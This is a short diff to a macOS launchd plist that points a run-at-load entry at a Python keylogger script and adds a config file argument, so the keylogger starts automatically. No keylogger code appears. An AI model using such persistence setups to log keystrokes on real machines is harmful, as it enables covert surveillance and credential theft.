@@ -7,8 +7,9 @@
    <key>ProgramArguments</key>
    <array>
    	<string>/usr/local/bin/python</string>
-   	<string>/var/scripts/keylogger.mac.pyw</string>
+   	<string>/Users/mariogarrido/Projects/keylogger/__init__.pyw</string>
    	<string>MAC_AIR</string>
+   	<string>/Users/mariogarrido/keylogger.ini</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
